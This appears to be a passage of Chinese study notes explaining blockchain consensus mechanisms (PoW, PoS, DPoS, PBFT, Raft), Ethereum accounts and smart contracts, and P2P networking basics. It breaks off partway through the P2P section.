难度值\n最大目标值：一个固定数（恒量，十六进制前8位0后面56位1，即32bit0）0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\n即前N bit为0\n目标值解析：若过去2016个区块花费时长少于20160分，那么难度值会变小，目标值将会被调小些；否则，目标值会被调大。\n 查找块的平均时间可以通过如下方式计算：time = difficulty * 2**32 / hashrate\n难度值 = time (s) * hashrate (hash / s ) / (2**32)\n新难度值 / 旧难度值 = 新算力 / 旧算力\n  如果难度为1的话，大约是每秒钟7 Mhashes\n  https://www.cnblogs.com/zhaoweiwei/p/difficulty.html\nhttps://en.bitcoin.it/wiki/Difficulty\n 例: 计算目标值,5min产生一个区块,sha256算法,算力 400M hash/s. 一个正确区块被计算,需要进行 (5*60)s * 400M hash/s = 120,000 M hash 假如计算一个区块头需要1M hash , 则 计算正确头的几率为 1 / (2^17) ,(120000 ≈ 2^17) 所以, (2^(256-17)) / 2^256 == 1 / 2^17 所以, 目标值为: 0b0……………………011…… |-17bit0-||--(256-17)bit-- POW工作量证明流程 流程如下图：\n 生成Merkle根哈希 组装区块头 计算出工作量证明的输出  ！！！：区块头里的随机数即是nonce\n 1.如上\n2.组装区块头：块头将被作为计算出工作量证明输出的一个输入参数，因此第一部计算出来的Merkle根哈希和区块头的其他组成部分组装成区块头\n3.计算出工作量证明的输出：\n​\ti) 工作量证明的输出 = SHA256( SHA256(区块头) )\n​\tii) if （工作量证明的输出 \u003c 目标值 ），证明工作量完成\n​\tiii) if （工作量证明的输出 \u003e= 目标值），变更随机数(Nonce)，递归 i 的逻辑，继续与目标值比对\n  对这个值进行两次SHA256运算，为什么要两次，这是因为SHA1在2017年被攻破，采用的方法是birthday collision attack。社区觉得SHA2被攻破也是时间的问题，而抵御birthday collision attack的有效方法为双重哈希算法，当然这种说法只是网上传言，没有得到具体确认。       客户端产生新的交易，向全网广播\n  每个节点收到请求，将交易纳入区块\n  每个节点通过pow工作量证明\n  当某个节点找到了证明，向全网广播\n  当且仅当该区块的交易是有效的且在之前中未存在的，其他节点才认同该区块的有效性\n  接受该区块且在该区块的末尾制造新的区块\n     节点总是认为最长的链是正确的链，并致力于在最长的链上进行扩展。\n  如果两个节点同时完成PoW过程并广播了不一样的区块，有的节点收到其中一个，而有的节点先会收到另一个。\n  这种情况下，首先收到的区块会被节点作为下一个区块添加到链上，同时也会保存后到的区块。\n  当下一个区块来临时，就会知道哪一个区块是比较长的，然后切换到较长的区块链上。\n   新交易的广播不一定要到达每一个节点，只要到达足够多的节点，这些节点就会在一定时间内将交易打包到区块中 区块的广播也是允许丢包的，如果节点没有收到某一个区块，当下一个区块到来时，该节点发现新区块的prevHash不是目前最后一个区块，就会去请求丢失的区块 因为做出工作量证明的节点上没有未建块的交易，从而有可能产生空块  POW的优缺点  **优点：**完全去中心化，节点自由进出 **缺点：**目前bitcoin已经吸引了全球大部分的算力，其他再用POW共识机制的区块链应用很难获得相同算力来保障自身的安全；挖矿造成大量的资源浪费；共识达成的周期较长，不适合商业应用  POS POS：权益证明机制（Proof of Stake），是Pow的一种升级共识机制，根据每个节点所占代币的比例和时间，等比例的降低挖矿难度，从而加快找到随机数的速度。\n若Pow主要比拼的是算力，那么Pos则是比拼余额。通俗说就是当手里的币越多，挖到一个块的概率越大\nPOS合格区块可以表述为：F(Timestamp) = Target * Balance，与POW的F(Nonce) \u003c Target  相比，式子左边的搜索空间由Nonce 变成 Timestamp，Nonce值域是无限的，而Timestamp的值域是极其有限的，一个合格的区块时间必须在前一个区块时间的规定范围之内，时间太早或者太超前的区块都不会被其他节点接纳。式子右边的目标值引入一个乘积因子余额，课件余额越大，整体目标值（Target*Balance）越大，越容易找到一个区块。因为Timestamp 有限，POS铸造区块成功率主要与Balance有关。\nPeercoin（PPC） PPC是POS的一种具体的实现方式\n​\tPPC是从中本聪所创造的BTC衍生出来的一种P2P的电子密码货币，以权益证明（Proof of Stake，以下简称PoS）取代工作量证明（Proof of Work，以下简称PoW）来维护网络安全。在这种混合设计中，PoW主要在最初的采矿阶段起作用。长远来看，PPC网络的安全并不依赖能源的消耗。因此PPC是一种节能而有成本优势的P2P电子密码货币。\n​\tPoS是基于币龄(coin age)并由通过与 BTC类似的由每个节点散列运算产生的，只是其搜索空间被限制了。区块链的历史及交易结算是通过一个中心化广播检查机制得到进一步保护。\n​\t要掌握Peercoin的POS机制，需要重点理解Sunny King专门为PPC设计的几个核心概念：\n  Coinage 币龄，也叫币天。假如1.5个币存在于区块链中10天，币龄数值为：Coinage = 1.5 * 10 = 15\nPPC采用币龄，而不是直接采用余额（Balance）来计算。一个UTXO(未花费的交易输出)一旦被花费，其币龄被清零，新的UTXO币龄从0开始算起\n  stakeReward 权益激励，俗称获得利息，计算公式如下：stakeReward = nCoinAge*33/(365*33+8)*0.01*COIN，\n公式可简化未：stakeReward = (0.01 * nCoinAge /365) * COIN\n其中，nCoinAge是CoinStake所有输入的币龄总和，由公式可知收益按1%年率计算。理想状态下，假设所有的币全年都参与挖矿，代币总量每年有1%通胀率，这一设计为很多人所诟病，而且，这一设计并不能激励矿工积极参与挖矿以维护区块链的安全，因为如果不考虑手续费，持币用户每隔几个月打开节点铸币，或者实时在线铸币，理论上收益都是一样的。\n  stakeMinAge POS系统也存在51%币龄攻击风险，为了增加攻击难度，Sunny King对每一笔UTXO的铸币资格做了最小年龄（stakeMinAge）限制：一个UTXO在区块链存在的时间小于stakeMinAge则没有铸币资格，PPC最小币龄为8小时。\n  POS2.0 黑币社区认为币龄可能会被恶意的节点滥用以获得更高的网络权重并成功实施双花攻击，于是发布POS2.0白皮书，对PPC做了几个细节优化，解决了一些潜在的安全问题，其中最重要的改进是用余额代替币龄，合格区块的条件由：\nF(Timastamp) \u003c Target * 币数 * 币的年龄\n变为： F(Timastamp) \u003c Target * 币数\n如此一来，一笔UTXO无论放置多久其锻造区块的能力不变，此举可激励节点必须更多的保持在线进行铸币，提高系统安全性，将攻击途径减少到最低限度，并且能够显著提高网络保持运行的节点数量。\nPOS3.0 黑币社区后来进一步升级，推出POS3.0版本，对交易手续费，难度调整做了一些优化，其中最显著的改变是将1%年利率奖励机制变为固定数额奖励（每个区块固定奖励1.5BLK），此举不但降低代币通胀率（考虑到会有代币永久丢失，低额奖励机制回归总量恒定的设计思路），同时意味着持币节点必须实时在线才能获得收益。\nPOS的优缺点  优点：在一定程度上缩短了共识达成的时间 缺点：还需要挖矿，本质上没有解决商业应用的痛点  DPoS DPOS：股份授权股份证明（Delegated Proof-Of-Stake）\n https://blog.csdn.net/liankuaixy/article/details/79820710\n 比特股（Bitshares）项目于2013年8月开始启动，对区块链做了很多改造，并引入许多新概念和特征，尤其令人眼花缭乱的 Bitshares X、多态数字资产交易平台、资产锚定等新名词，一时令人无比兴奋而又困惑。此时POW和POS都已成功运行许久，彼此优劣已被反复讨论，两大阵营时至今日依然争论不休。按照项目规划，比特股对交易容量和区块速度有极高要求，显然POW或POS都达不到要求，于是比特股发明了一种新的共识机制DPOS，即股份授权股权证明。\nDPOS是 PoS 的进化方案，在常规 PoW 和 PoS 中，一大影响效率之处在于任何一个新加入的 Block，都需要被整个网络所有节点做确认。\nDPoS 优化方案 ​\t通过不同的策略，不定时的选中一小群节点，这一小群节点做新区块的创建，验证，签名和相互监督，这样就大幅度的减少了区块创建和确认所需要消耗的时间和算力成本。\nDPOS机制涉及的问题  1. 持有股票\n直接在交易平台上购买比特股即可\n2. 成为代表\n成为一名代表，你必须在网络上注册你的公钥，分配到一个32位的特有标识符\n3. 授权选票\n每个钱包有一个参数设置窗口，在该窗口里用户可以选择一个或更多的代表，并将其分级\n一般情况下，用户不会创建特别以投票为目的的交易，因为那将耗费他们一笔交易费\n4. 保持代表诚实\n每个钱包将显示一个状态指示器，让用户知道他们的代表表现如何\n5. 抵抗攻击\n在抵抗攻击上，因为前100名代表所获得的权利权是相同的，每名代表都有一份相等的投票权，并且，如果当前记账节点不记账则由下一个记账人记账，因此无法通过获得超过1%的选票而将权力集中到一个单一代表上，毕竟同时收买100给代表的难度很大。同时，每名代表的标识是其公钥而非IP地址，使得DOS攻击目标更为困难（难定位）\n6. 代表竞选\n选出的代表拥有提出改变网络参数的特权，包括交易费用、区块大小、见证人费用和区块区间\n DPOS遵循的基本原则  持股人依据所持股份行使表决权，而不是依赖挖矿竞争记账权 最大化持股人的盈利 最小化维护网络安全的费用 最大化网络的效能 最小化运行网络的成本（带宽、CPU等）  DPOS的优缺点   优点：     能耗更低：DPoS机制将节点数量进一步减少，在保证网络安全的前提下，整个网络的能耗进一步降低，网络运行成本最低。\n  更快的确认速度：每个区块的时间为10秒，一笔交易（在得到6-10个确认后）大概1分钟，一个完整的区块的周期大概仅仅需要数分钟。而PoW机制下产生一个区块需要10分钟，一笔交易完成需要数个小时。\n  在一定程度上解决了拒绝服务攻击和潜在作恶节点联合作恶的问题。\n    缺点：     投票的积极性并不高：绝大多数持股人从未参与投票。这是因为投票需要时间、精力以及技能，而这恰恰是大多数投资者所缺乏的。\n  垄断性高：DPoS延续了PoS的弊端，只有持币者才可以获得区块链奖励，其实这就带来了一种制度性门槛，最终导致DPoS币的流动性大大减少，穷者越穷，富者越富。\n  PBFT PBFT：实用拜占庭容错算法（Practical Byzantine Fault Tolerance）\n以往的区块链项目都以虚拟币为内核，而记录数据的应用不需要币机制模型。这个时候，Hyper Ledger（超级账本）应景而生，它是由Linux基金会组织牵头的项目，是一个旨在推动区块链数字技术和交易验证的开源项目。这个分布式账本技术是完全共享、透明和去中心化的，非常适合于金融行业的应用，以及其他的例如制造、银行、保险、物联网等无数个其他行业。\n PBFT是Hyper Ledger中使用的共识算法   https://learnblockchain.cn/2019/08/29/pbft/\nhttps://blog.csdn.net/jfkidear/article/details/81275974\n PBFT的算法基本流程 假设有f个恶意节点，则保证系统正常运作，需要有2f+1个正常节点，总结点数为3f+1\n 客户端发送请求给主节点 主节点广播请求给其他节点，节点执行pbft算法的三阶段共识流程 节点处理完三阶段流程后，返回消息给客户端 客户端收到来自f+1个节点相同消息后，代表共识已经正确完成  如图：\nC为Client，pre-prepare为预准备阶段，prepare为准备阶段，commit为提交阶段\n R在一个视图里，一个是主节点，其余的都叫做备份节点，如图主节点为0，即Client首先请求主节点负责将客户端的请求排好序，然后按序发给备份节点\n但是主节点可能是拜占庭的：他可能会给不同的请求编上相同的序号，或者不去分配序号，后者让相邻序号不连续。\n备份节点应当有职责主动检查这些序号的合法性，并能通过timeout机制检测到主节点是否已经宕机。\n当出现异常情况下，就会出发视图更换view change协议来选举出新的主节点\n Requset阶段 在此阶段，客户端c向主节点p发送请求，\u003cRequest，operation，timestamp，clientID\u003e\n operation：为请求具体操作\ntimestamp：请求时客户端追加的时间戳\nclientID：客户端标识\nRequset：包含消息内容message，以及信息摘要d(message)\n 客户端对请求进行签名\nPBFT算法预备（Pre-Prepare） 在预准备阶段，主节点对签名进行校验，并分配一个序列号n给收到的请求，然后向所有备份节点群发预准备消息，预准备消息的格式为：\u003c \u003cPre-Prepare，v，n，d\u003e ， m \u003e\n v是视图编号\nn是序列号\nm是客户端发送的请求消息\nd是请求消息m的摘要\n 预准备消息的目的是作为一种证明，确定该请求是在视图v中被赋予了序号n\n在视图变更的过程中可以追索请求\n请求本身是不包含在预准备消息中，这样能使预准备消息足够小\nPrepare 当节点收到pre-prepare消息后，会选择接收与否\n满足下列条件时，各个备份节点才会接收一个预准备消息：①请求和预准备消息的签名正确，并且d与m的摘要一致；②当前视图编号是v；③该备份节点从未在视图v中接收过序号为n但是摘要d不同的消息m；④预准备消息的序号n必须在水线上下限h和H之间，水线存在的意义在于防止一个失效节点用一个很大的序号消耗序号空间。\n如果备份节点i接受了预准备消息\u003c \u003cPre-Prepare，v，n，d\u003e ， m \u003e，则进入准备阶段。\n在准备阶段的同时，该节点向所有副本节点发送准备消息 \u003c Prepare，v，n，d，i \u003e，并且将预准备消息和准备消息写入自己的消息日志，可丢弃非法请求（即非法预准备消息）\n节点（包括主节点）收到prepare消息后，进行验证prepare消息签名是否正确，视图编号是否一致，消息序号是否满足水线限制，若验证通过则将消息写入消息日志中。\n副本节点i将（m，v，n，i）记入消息日志中，其中m是请求内容，预准备消息m在视图v中的编号n，以及2f个从不同副本节点收到的与预准备消息一致的准备消息\n每个副本节点验证预准备和准备消息的一致性主要检查：视图编号v、消息序号n和摘要d\nCommit 当prepared (m,v,n,i)条件为真的时候，\n  副本i生成确认消息\n  追加到本地消息日志文件\n  将确认消息向其他副本节点\n  广播进入了确认阶段 \u003c COMMIT，v，n，D(m)，i\u003e\n  每个副本节点接收Commit消息的条件是：\n Commit消息签名正确 上一阶段请求的摘要也是D(m) 消息的视图编号与节点的当前视图编号一致 消息的序号n满足水线条件，在h和H之间  一旦确认消息的接受条件满足了，则该副本节点将确认消息写入消息日志中\n当节点收到2f+1（包括自身）个不同节点发送过来的Commit消息之后，进入Commit-local(m，v，n)状态，且所有序号小于n的请求都被处理，则执行客户端请求m中所要求的服务操作\n保证在节点中提交的任意一个客户端请求，最终哦都会在另外2f个节点中被提交到本地的，并确保所有正常节点以同样顺序执行所有请求，这样就保证了算法的正确性\nReply 同时将执行结果发送给客户端 \u003cReply ，v，t，c，i，r\u003e，r为请求操作结果\n如果客户端收到f+1个相同的Reply消息，说明客户端发起的请求已经达到全网共识，否则客户端需要判断是否重新发送请求给主节点\n副本节点会把时间戳比已回复时间戳更小的请求丢弃，以保证请求只会被执行一次\nPBFT 检查点 （checkpoint）  如何清除历史请求的记录消息？\n在执行完多条请求K（例如：100条）后执行一次状态同步，即发送CheckPoint消息。\u003cCheckPoint, n, d, i\u003e，n是当前节点所保留的最后一个视图请求编号，d是对当前状态的一个摘要，该CheckPoint消息记录到log中。\n如果副本节点i收到了2f+1个验证过的CheckPoint消息，则清除先前日志中的消息，并以n作为当前一个stable checkpoint。\n   stable checkpoint（稳定检查点）呢？\n大部分节点（2f+1）已经共识完成的最大请求序号。比如系统有4个节点，三个节点都已经共识完了的请求编号是213.那么这个213就是stable checkpoint\n  实际上当副本节点i向其他节点发出CheckPoint消息后，其他节点有可能还没有完成K条请求，所以不会立即对i的请求作出响应，它还会按照自己的节奏，向前行进。此时发出的CheckPoint未能形成stable，为防止i的处理请求过快，设置一个高低水位区间[h, H]来解决这个问题， 低水位h等于上一个stable checkpoint编号，高水位H = h + L，其中L是我们指定的数值（如100，或200）， 当副本节点i处理请求超过高水位H时，就会停止脚步，等待stable checkpoint发生变化，再继续前进。\n算法视图变更 每个副节点维持一个计数器。备份节点在接收到一个有效请求，但是还没有执行它时，会查看计时器是否在运行，如果没有，那么它将启动计时器；当请求被执行时就把计时器停止。\n如果计时器超时，将会把视图变更的消息向全网广播。在主节点失效的时候仍然保证系统的活性，防止备份节点无期限地等待请求的执行。需要确保在新的view中如何来延续上一个view最终的状态， 比如给这时来的新请求的编号，比如如何处理上一个view还没来得及完全处理好的请求\n计时器超时或发现作恶，副节点生成 view-change 消息 \u003cVIEW-CHANGE,v+1,n,C,P,i\u003e，最近一次的稳定检查点对应的请求的序列号 n，C 是证明该检查点稳定性的 2f+1 个 checkpoint 消息的集合，P 是 Pm 的集合，其中 m 是副节点 i 中的序列号大于 n 的等待提交和执行的客户端请求 m，每个 Pm 包含了如下的信息：①pre-prepare 消息；②2f 个由其他副节点签名的跟 pre-prepare 消息匹配的、有效的 prepare 消息；\n此时，节点需要：\n 记录到本地日志文件中；\n同时广播给其他节点；\n要求替换掉主节点，变更到下一个视图 v+1；\n  注意，在视图变更期间，除了 checkpoint、view-change 和 newview 消息之外，备份节点 i 是不会接受其他消息的  在节点收到更换节点消息时，各个节点会收集视图变更信息，并发送确认给 view v+1 中的主节点。\n（v+1 中的主节点可能是轮换产生，也可能选举产生）\n新的主节点接收到 2f 个有效的 view-change 消息之后，发送自己签名σp' 的 new-view 消息\u003cNEW-VIEW, v+1, V, O\u003e ，V是主节点收到的2f+1个有效的VIEW-CHANGE消息 ，O是主节点重新发起的未经完成的PRE-PREPARE消息集合\n  找到所有节点的共同的稳定检查点h。\n  在h和h+L之间，如果存在n消息，则创建\u003c\u003cPRE-PREPARE, v+1, n, d\u003e, m\u003e消息。否则创建一个空的PRE-PREPARE消息，即：\u003c\u003cPRE-PREPARE, v+1, n, d(null)\u003e, m(null)\u003e, m(null)空消息，d(null)空消息摘要。\n  对于节点v+1，提议系统内所有节点切换到下一个视图 v+1，同时接受自己成为新的主节点\n副节点收到要求将视图变更为 v+1 的 new-vew 消息后，确认消息有效，接受该 new-view 消息，记录到本地消息文件中，同时将视图更换到新的视图v+1，副节点把 new-view 中携带的由新的主节点重新生成的 pre-prepare 消息追加记录到本地的消息日志中，按照检查点协议进行垃圾回收，删除比较老的消息\n 对于 new-vew 消息中集合 O 中携带的所有由新主节点生成的新的 pre-prepare 消息，备份节点都会生成相应的 prepare 消息，记录到本地日志文件中，转发给其他节点，即对这些未处理的请求在新的视图中重新执行一遍三阶段协议，保证视图切换过程中未处理的请求能够重新被处理。\n   节点选出一个checkpoint作为新view处理请求的起始状态checkpoint就是当前节点处理的最新请求序号。\n  checkpoint就是当前节点处理的最新请求序号。 前文已经提到主节点收到请求是会给请求记录编号的。比如一个节点正在共识的一个请求编号是101，那么对于这个节点，它的checkpoint就是101\n  stable checkpoint（稳定检查点）呢？\n大部分节点（2f+1）已经共识完成的最大请求序号。比如系统有4个节点，三个节点都已经共识完了的请求编号是213.那么这个213就是stable checkpoint。checkpoint的最大目的时减少内存占用。\n  当检查点被证明是稳定后，节点会把本地消息日志中的消息中客户端请求序列号小于或者等于 n 的消息（pre-prepare、prepare、commit 消息）都删掉。同时，它会删掉旧的检查点和 checkpoint 消息。\nRAFT RAFT最初是一个用于管理复制日志的共识算法，它是一个为真实世界应用建立的协议，主要注重协议的落地性和可理解性，RAFT是在非拜占庭故障下达成共识的强一致协议\nRaft算法包含三种角色，分别是：跟随者（follower），候选人（candidate）和领导者（leader）。一个节点在某一时刻只能是这三种状态的其中一种，这三种角色是可以随着时间和条件的变化而互相转换的。\n所有的节点初始状态都为follower，超时未收到心跳包的follower将变身candidate并广播投票请求，获得多数投票的节点将化身leader，这一轮投票的过程是谁先发出谁有利，每个节点只会给出一次投票，leader节点周期性给其他节点发送心跳包，leader节点失效将会引发新一轮的投票过程。\nRaft阶段主要分为两个，首先是leader选举过程，然后在选举出来的leader基础上进行正常操作，比如日志复制、记账等。\n 关于RAFT的较详细的动画，可访问 http://thesecretlivesofdata.com/raft/  选举流程 RAFT的leader选举流程： 1）任何一个服务器都可以成为一个候选者candidate，它向其他服务器follower发出要求选举自己的请求。 2）其他服务器同意了，发出OK。注意，如果在这个过程中，有一个follower宕机，没有收到请求选举的要求，此时候选者可以自己选自己，只要达到N/2+1的大多数票，候选人还是可以成为leader的。 3）这样这个候选者就成为了leader领导人，它可以向选民也就是follower发出指令，比如进行记账。 4）以后通过心跳进行记账的通知。 5）一旦这个leader崩溃了，那么follower中有一个成为候选者，并发出邀票选举。 6）follower同意后，其成为leader，继续承担记账等指导工作。 记账过程 Raft的记账过程按以下步骤完成： 1）假设leader领导人已经选出，这时客户端发出增加一个日志的要求； 2）leader要求follower遵从他的指令，都将这个新的日志内容追加到他们各自日志中； 3）大多数follower服务器将交易记录写入账本后，确认追加成功，发出确认成功信息； 4）在下一个心跳中，leader会通知所有follower更新确认的项目。 对于每个新的交易记录，重复上述过程 RAFT和PBFT对比 一个团队一定会有一个老大和普通成员。对于raft算法，共识过程就是：只要老大还没挂，老大说什么，我们（团队普通成员）就做什么，坚决执行。那什么时候重新老大呢？只有当老大挂了才重选老大，不然生是老大的人，死是老大的鬼。\n对于pbft算法，共识过程就是：老大向我发送命令时，当我认为老大的命令是有问题时，我会拒绝执行。就算我认为老大的命令是对的，我还会问下团队的其它成员老大的命令是否是对的，只有大多数人（2f+1）都认为老大的命令是对的时候，我才会去执行命令。那什么时候重选老大呢？老大挂了当然要重选，如果大多数人都认为老大不称职或者有问题时，我们也会重新选择老大。\n1.raft算法从节点不会拒绝主节点的请求，而pbft算法从节点在某些情况下会拒绝主节点的请求 ;\n2.raft算法只能容错故障节点，并且最大容错节点数为（n-1）/2，而pbft算法能容错故障节点和作恶节点，最大容错节点数为（n-1）/3。\n区块链架构 比特币 区块链1.0 区块链1.0是可编程货币，是与转账、汇款和数字化支付相关的密码学货币应用，目标是实现货币的去中心化与支付手段。比特币是区块链1.0最典型的代表, 区块链的发展催生了大量的货币交易平台，实现了货币的部分职能，能够实现货品交易。\n 比特币钱包：\n 移动钱包 桌面钱包 互联网钱包 纸钱包   优势  利于并行 可回溯 避免数据膨胀  缺点  查余额时必须回溯查询一大堆交易信息，浪费大量时间和资源  以太坊 区块链2.0 区块链2.0是可编程金融，是经济、市场和金融领域的区块链应用，核心理念是把区块链作为一个可编程的分布式信用基础设施，支撑智能合约应用，以与过去比特币区块链作为一个虚拟货币支撑平台区别开来。\n以太坊：数字代币，基于智能合约\n以太坊架构如上\n    比特币 以太坊     账户设计 无账户的概念，每个账户的余额都是从他们在区块链上的UTXO计算出来的 拥有外部账户和合约账户，外部账户为用户账户，由私钥控制。合约账户是一种可编程账户，受代码控制并由外部账户激活   区块链设计 采用Merkle树将交易的哈希值组成二叉树状结构，顶层节点的哈希值用来校验交易清单 采用Merkle Patricia树来实现对交易和状态的校验和查询。   计算和图灵完备 非图灵完备 图灵完备   EVM高级语言 不提供高级语言支持 提供Solidity、Serpent、LLL等高级语言让用户编写智能合约，高级语言会编译成在EVM中执行的EVM字节码   P2P网络 比特币P2P协议 创建引入RLPx与Whisper网络协议，RLPx协议主要功能是在节点间建立通信并维持通信；Whisper协议主要用于Dapp之间的通信。以太坊P2P网络实现了更多功能扩展   事件 无事件概念 以太坊中的事件是一个以太坊日志和事件监测的协议的抽象。日志的记录中提供合约的地址；事件利用现有的ABI功能来解析日志记录   共识机制 采用PoW机制，依靠的是CPU计算难度问题 对比特币PoW机制进行改进，加入内存难度，具有抵抗单凭哈希运算优化的ASIC挖矿机的属性，以太坊未来将采用PoS共识机制    以太坊客户端 较为流行的是go-Ethereum和Parity\n两种账户类型：外部持有账户（EOA）和合约账户（CA）\n外部账号可以调用合约账户\n以太坊中的世界状态定义为以太坊区块链中的全局状态，表示为以太坊地址和账户状态之间的映射。\nu账户状态由4个字段组成:\n  nonce：当每次从地址发送交易时，该值递增。在合约账户中，该值代表账户创建的合约数量。\n  **balance:**账户余额。ether也认为是以太币的单位，另一个常用的单位是wei。\n  storageroot：代表Merkle Patricia树的根节点,并对账户的存储内容进行编码。（合约账户）\n  codehash:作为一个不可变字段,包含了与账户关联的智能合约代码的哈希值。在普通账户中,该字段包含一个空字符串的 Keccak 256位哈希值。另外,代码通过一个消息调用而被调用。\n  智能合约 定义：广义的智能合约是一种安全的、处于运行状态的计算机程序 ，体现了一种自动执行以及强制执行的协议。\n狭义上讲，智能合约就是存储在区块链上的代码，用以实现执行特定的功能；能根据预先任意制定的规则来自动转移数字资产的系统。\n智能合约有以下属性\n 自动执行 强制执行 明确的语义 安全性和不可阻止性  ​\t智能合约实际上是采用某种语言编写的、计算机或目标可理解的计算机程序.此外，智能合约还包含了以业务逻辑形式出现的各方之间的协议.另一个核心理念是，当某些条件满足时，智能契约将自动执行.另外，强制性意味着所有的合约条款都是按照规定和预期执行的，对于攻击者而言同样如此.\n​\t智能合约还具备安全性以及“不可阻挡”性，也就是说，计算机程序必须以这样一种方式设计：在合理的时间范围内具备容错能力并保持执行状态，即使外部因素处于不利状态下，相关程序也应能够执行和维护一个健康的内部状态.\n​\t智能合约应该具备确定性.据此，网络上的任何节点运行同一个智能合约，并获得相同的结果.如果最终结果在节点之间略有不同，那么将无法达成共识，因此，区块链上分布式共识的整个范例可能会失效.\n  智能合约的优点：\n 高效的实时更新 准确执行 较低的人为干预风险 去中心化权威 较低的运行成本    智能合约的缺点：\n 漏洞无法修复 隐私保护风险 缺乏有效监管 无法完全实施    智能合约The DAO事件： DAO是最高的众筹项目之一，于2016年4月启动\nDAO遭受攻击后，创建了硬分叉用于修复，但违背了去中心化的理念。\n以太坊虚拟机 以太坊虚拟机时以太网上智能合约的运行环境\n特点有①高度脚本化的设计语言使得智能合约的开发更简单；②和以太坊区块链一样同时存储于各个节点计算机上；③简单式堆栈架构，可应用于256位的Keccak散列算法和椭圆曲线计算；④可处理异常执行，包括堆栈溢出和无效指令等；⑤图灵完备，支持任何种类的计算，代码执行受参数Gas的严格制约。\n智能合约的使用步骤 ①编译合约===\u003e\u003e\u003e②创建合约===\u003e\u003e\u003e③部署合约===\u003e\u003e\u003e④调用合约===\u003e\u003e\u003e⑤监听合约||⑤销毁合约；\n编译智能合约 以太坊上的合约就是一段可以被虚拟机执行的代码，这些代码以以太坊特有的二进制的形式存储在区块链上，并由以太坊虚拟机解释，因此被称为以太坊虚拟机位码。目前，用于以太坊智能合约开发的语言主要由Solidity、Serpent、LLL。\nSolidity作为最流行的智能合约语言， 以其简单易用和高可读性受到以太坊设计者们的推荐\n创建智能合约 创建合约，需要输入合约名称，合约版本号、合约创建者、合约的内容等\n部署智能合约 部署合约就是将编译好的合约字节码通过外部账户发送交易的形式部署到以太坊区块链上，部署合约时，需要支付费用，要确保账户里有足够的余额（可以创建自己独立的测试网络，即自己的区块链，初始化的时候就可以初始化一些有余额的账户）。部署合约的一般流程：\n①输入命令，部署合约；\n②查看交易池待处理状况，如有待确认的交易，查看交易内容；\n③查看挖矿日志，检验交易是否已发送到以太坊区块链上；\n④等待矿工确认，利用txpool.status命令查看交易池状态；\n⑤利用eth.getblock命令查看区块中是否含有关于合约的交易。\n调用智能合约 智能合约的调用需要两个字段：和约地址（表明调用哪个合约）和合约abi(application binaryinterface)（表明具体用合约的哪个方法）\n原因：首先，合约内容是可以完全重复的，所以我们根据合约名字、合约内容或者合约内容的哈希，去调用某一个合约都是可能重复的，只有合约地址是不会重复的。另外，合约内的函数名是可以重载的，就是说我们可以有多个叫setValue的函数，但是所需要的传入参数不同。EVM中使用了abi，便于调用，同时还能区分不同的函数。调用合约的一般流程：\n①利用eth.contract来定义一个合约类，定义的合约类遵循ABI定义，构建合约实例\n②调用合约\n监听智能合约 合约部署后，可设置监听，既可以实时监控事件，也可以从历史区块中检索 event。\n销毁智能合约 合约也可以结束，当一个合约通过kill方法将其杀死，那么我们将不能再和这个合约进行交互，如果一个合约被销毁，那么当前地址指向的是一个僵尸对象，这个僵尸对象调用任何方法都会抛出异常。此时需要调用selfdestruct(address)才能将其进行销毁。\n需要指出的是只有拥有者才能销毁合约。\n应用场景 数字身份 智能合约可以允许个人拥有并且控制包含数据、信誉和数字资产在内的数字身份。它允许个人自己决定向对手公开的数据内容，更为企业提供无缝了解客户的机会。\n交易对手将不能获取敏感数据来验证交易。这减少了责任，同时促进了解你的客户法规（KYC）要求的无摩擦化，还提高了合规性，可恢复性和互操作性。\n记录 智能合同可以将统一商业代码（Uniform Commercial Code，UCC）归档数字化，并且自动更新发布流程。他们还可以自动地完善贷款人的贷款担保物权。它们可以自动遵守在将来销毁所要求记录的规则。不仅如此，还能通过UCC留置权自动解锁，自动更新或自动请求抵押品。在执行此类功能时，智能合同能够降低法律成本。\n证券 智能合约可以简化资本构成表的管理。它们还绕开证券托管链中的中间人，并促进自动支付股息，股票分拆和负债管理，同时降低操作风险。智能合约能将分布式账本上证券的工作流程数字化。\n贸易金融 智能合约可以通过快速信用证和贸易支付开启来简化国际货物转移，同时获得更大的金融资产的流动性，提高买家，供应商和机构的融资效率。此外，政府必须确定在执行失败的情况下，特别是在纠纷和违约的情况下，法律应当如何界定责任。\n对于贸易金融而言，结算系统、技术要求和离散生态系统的整合是重要的三元素。\n供应链 智能合约可以让供应链中的每一步变得实时可见。互联网设备可以将产品从工厂车间转移到商店货架之间的每个步骤都记录下来。它们促进粒度级别的库存跟踪，这有利于保护供应链的融资、保险和风险。这种增强的跟踪和验证技术降低了盗窃和欺诈的风险。如果想让智能合约实现大规模应用，供应链参与者必须证明其身份，包括公司，机构，个人，传感器，设施和产品等。\n汽车保险 智能合约可以改善目前混乱的汽车投保及赔付流程。智能合约可以记录相关政策、驾驶记录和驾驶员报告，允许互联网车辆在发生事故后立即执行索赔。合约能够自动处理索赔，验证和付款过程。每个投保人的存储库中都包括了驾驶记录，车辆和事故报告历史。消除重复的报告也会节省成本。不过，这些都需要跨行业协作来解决技术，监管和财务上的挑战。\nP2P p2p简介 定义：\n网络的参与者共享他们所拥有的一部分硬件资源（处理能力、存储能力、网络连接能力、打印机等），这些共享资源通过网络提供服务和内容，能被其它对等节点(Peer)直接访问而无需经过中间实体。在此网络中的参与者既是资源（服务和内容）提供者（Server），又是资源获取者（Client）。\nP2P网络原理 从计算模式上来说，P2P打破了传统的Client/Server (C/S)模式，在网络中的每个结点的地位都是对等的。每个结点既充当服务器，为其他结点提供服务，同时也享用其他结点提供的服务。\nP2P改变了目前互联网中占主导地位的客户/服务器结构中信息在消费者和生产者之间的不平衡。由于P2P网络没有中心节点（中心服务器），网络中的每个节点具有信息消费者和信息提供者的双重身份P2P，同时具有信息通信方面的功能，因此P2P应用的实现扩展性强，实现方式灵活多样，部署成本低，给互联网的发布和共享带来了巨大的空间。\nP2P特点   P2P是动态的：动态地提供信息和服务\n  P2P是双向的：切实实现信息和服务的交换与共享\n  P2P是直接的：无中介、等级和格式限制，直接交换信息和服务\n  P2P是平等的：生产者与消费者地位平等，角色合二为一\n  P2P是及时的：无服务器参与空间分配，可提供实时、可升级的信息\n  P2P是有效的：可充分利用个人计算机的硬件设备、传输信息和服务时目标确定\n  P2P优势   非中心化\n网络中的资源和服务分散在所有节点上，信息传输和服务的实现都直接在节点之间进行，可以无需中间环节和服务器的介入，避免了可能的瓶颈。\n  